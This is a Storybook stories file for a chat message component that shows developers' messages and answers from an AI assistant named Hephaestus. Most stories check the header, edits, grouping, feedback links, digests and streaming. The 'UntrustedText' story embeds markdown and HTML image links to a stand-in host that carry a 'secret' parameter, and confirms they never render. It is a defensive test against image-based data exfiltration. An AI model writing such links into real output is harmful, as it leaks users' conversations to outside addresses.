import type { Meta, StoryObj } from "@storybook/react-vite";
import { expect } from "storybook/test";

import { minutesBefore } from "@/stories/story-clock";

import {
	ANSWER,
	ANSWER_WITH_FEEDBACK,
	DEVELOPER,
	DIGEST,
	QUESTION,
	SLACK_ANSWER,
	SLACK_QUESTION,
	WEEKLY_DIGEST,
	WORKSPACE_SLUG,
} from "./fixtures";
import { HephMessage } from "./HephMessage";
import { WeeklyDigestCard } from "./WeeklyDigestCard";

const meta = {
	component: HephMessage,
	parameters: { layout: "padded" },
	tags: ["autodocs"],
	args: { message: QUESTION, developer: DEVELOPER },
	decorators: [
		(Story) => (
			<div className="max-w-3xl">
				<Story />
			</div>
		),
	],
} satisfies Meta<typeof HephMessage>;

export default meta;
type Story = StoryObj<typeof meta>;

/** The developer's message, signed with their name. */
export const Default: Story = {
	play: async ({ canvas }) => {
		await expect(canvas.getByText("Ada Lovelace")).toBeVisible();
		await expect(canvas.queryByText("Slack")).toBeNull();
	},
};

/** Hephaestus's headings stand out from its text, one level below the heading the message sits under. */
export const Heph: Story = {
	args: { message: { ...ANSWER, text: SLACK_ANSWER.text } },
	play: async ({ canvas, canvasElement }) => {
		await expect(canvas.getByText("Hephaestus", { exact: true })).toBeVisible();
		await expect(canvas.getByText("AI", { exact: true })).toBeVisible();
		// A stored answer never fades in, on its first paint or a remount.
		await expect(canvasElement.querySelector("[data-sd-animate]")).toBeNull();
		const heading = canvas.getByRole("heading", { level: 3, name: "Why" });
		await expect(Number(getComputedStyle(heading).fontWeight)).toBeGreaterThanOrEqual(600);
	},
};

/** Written in Slack: the header says where, so the reader knows the conversation moved. */
export const Slack: Story = {
	args: { message: SLACK_QUESTION },
	play: async ({ canvas }) => {
		await expect(canvas.getByText("Slack")).toBeVisible();
	},
};

/** Edited in Slack after it was sent. */
export const Edited: Story = {
	args: { message: { ...SLACK_QUESTION, editedAt: minutesBefore(35) } },
	play: async ({ canvas }) => {
		await expect(canvas.getByText("(edited)")).toBeVisible();
	},
};

/**
 * Hephaestus's words, then each result, problem or feedback it showed, in Hephaestus's words and in the order
 * Hephaestus linked it, with a link to the developer's feedback on the work it is about.
 */
export const FeedbackLinks: Story = {
	args: { message: ANSWER_WITH_FEEDBACK, workspaceSlug: WORKSPACE_SLUG },
	play: async ({ canvas }) => {
		await expect(
			canvas.getByText(/but not why it beat invalidating on write/u, { selector: "p" }),
		).toBeVisible();
		await expect(
			canvas.getByText(/add one line on why the cache beats/u, { selector: "p" }),
		).toBeVisible();
		await expect(canvas.getByText(/explained its decision well/u, { selector: "p" })).toBeVisible();
		// The problem and the feedback name their work; the result's work the developer can no longer see.
		const links = canvas.getAllByRole("link", { name: "Your feedback on this work" });
		await expect(links.map((link) => link.getAttribute("href"))).toStrictEqual([
			"/w/aet/feedback/421",
			"/w/aet/feedback/433",
		]);
	},
};

/** Without the workspace, Hephaestus's words stay, and nothing links. */
export const FeedbackLinksUnlinked: Story = {
	args: { message: ANSWER_WITH_FEEDBACK },
	play: async ({ canvas }) => {
		await expect(
			canvas.getByText(/but not why it beat invalidating on write/u, { selector: "p" }),
		).toBeVisible();
		await expect(canvas.queryByRole("link")).toBeNull();
	},
};

/** A follow-up from the same author moments later drops the avatar and the header, but still names them to a screen reader. */
export const Grouped: Story = {
	args: { grouped: true },
	play: async ({ canvas }) => {
		await expect(canvas.queryByText("AL")).toBeNull();
		await expect(canvas.getByText(/^Ada Lovelace, /u)).toHaveClass("sr-only");
	},
};

/** Every answer keeps its author and AI disclosure, including a follow-up beside another answer. */
export const GroupedAnswer: Story = {
	args: { message: ANSWER, grouped: true },
	play: async ({ canvas }) => {
		await expect(canvas.getByText("Hephaestus", { exact: true })).toBeVisible();
		await expect(canvas.getByText("AI", { exact: true })).toBeVisible();
	},
};

/** The developer deleted it. The row stays, so the answers around it still read in order. */
export const Deleted: Story = {
	args: { message: { ...QUESTION, deleted: true, text: "" } },
	play: async ({ canvas }) => {
		await expect(canvas.getByText("This message was deleted.")).toBeVisible();
	},
};

/** A weekly digest summarizes recorded work without a model. */
export const Digest: Story = {
	args: {
		message: DIGEST,
		children: <WeeklyDigestCard digest={WEEKLY_DIGEST} workspaceSlug={WORKSPACE_SLUG} />,
	},
	play: async ({ canvas }) => {
		await expect(canvas.getByText("Weekly digest")).toBeVisible();
		await expect(canvas.queryByText("AI", { exact: true })).toBeNull();
		await expect(canvas.getByText("5–11 October 2026")).toBeVisible();
		await expect(canvas.queryByText(/weekly_digest\.json/u)).toBeNull();
	},
};

/**
 * Hephaestus's words can quote text a teammate wrote. Neither they nor a shown result can make the browser
 * load an image, so nothing the page renders sends the conversation to another address.
 */
export const UntrustedText: Story = {
	args: {
		message: {
			...ANSWER_WITH_FEEDBACK,
			text: [
				"Here is the summary. ![summary](https://x.example/p?d=secret)",
				"",
				'<img src="https://x.example/q?d=secret" alt="raw">',
			].join("\n"),
			links: ANSWER_WITH_FEEDBACK.links.map((link) => ({
				...link,
				text: `${link.text} ![chart](https://x.example/r?d=secret)`,
			})),
		},
		workspaceSlug: WORKSPACE_SLUG,
	},
	play: async ({ canvas, canvasElement }) => {
		await expect(canvas.getByText(/Here is the summary/u)).toBeVisible();
		await expect(canvas.getByText(/a five-minute cache/u)).toBeVisible();
		await expect(canvasElement.querySelectorAll("img")).toHaveLength(0);
	},
};

/** Still arriving: a construct Hephaestus has not closed yet already renders as written. */
export const Streaming: Story = {
	args: {
		message: { ...ANSWER, text: "Your team asks for pull request descriptions that **explain" },
		streaming: true,
	},
	play: async ({ canvas }) => {
		const explain = canvas.getByText("explain");
		await expect(Number(getComputedStyle(explain).fontWeight)).toBeGreaterThanOrEqual(600);
		await expect(canvas.queryByText(/\*\*/u)).toBeNull();
	},
};
